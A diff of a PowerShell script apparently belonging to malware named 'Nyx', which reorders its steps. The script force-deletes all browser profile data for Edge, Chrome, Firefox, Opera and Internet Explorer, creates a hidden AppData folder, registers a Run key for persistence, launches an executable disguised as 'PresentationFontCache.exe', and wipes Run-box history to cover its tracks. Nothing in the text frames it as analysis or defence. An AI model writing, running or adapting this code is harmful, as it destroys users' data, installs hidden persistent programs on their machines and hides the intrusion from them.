@@ -1,5 +1,12 @@
 # Nyx - 2D4SR6CP
 
+# Remove browser data
+Remove-Item "$env:LOCALAPPDATA\Microsoft\Internet Explorer\*" -Recurse -Force
+Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\*" -Recurse -Force
+Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\*" -Recurse -Force
+Remove-Item "$env:APPDATA\Mozilla\Firefox\Profiles\*" -Recurse -Force
+Remove-Item "$env:APPDATA\Opera Software\Opera Stable\*" -Recurse -Force
+
 # Create folder for Nyx
 New-Item -Path "$env:APPDATA" -Name "2D4SR6CP" -ItemType Directory
 
@@ -20,13 +27,6 @@ New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
 
 # Run Nyx
 & "$env:APPDATA\2D4SR6CP\PresentationFontCache.exe"
-
-# Remove browser data
-Remove-Item "$env:LOCALAPPDATA\Microsoft\Internet Explorer\*" -Recurse -Force
-Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\*" -Recurse -Force
-Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\*" -Recurse -Force
-Remove-Item "$env:APPDATA\Mozilla\Firefox\Profiles\*" -Recurse -Force
-Remove-Item "$env:APPDATA\Opera Software\Opera Stable\*" -Recurse -Force
 
 # Delete run box history
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
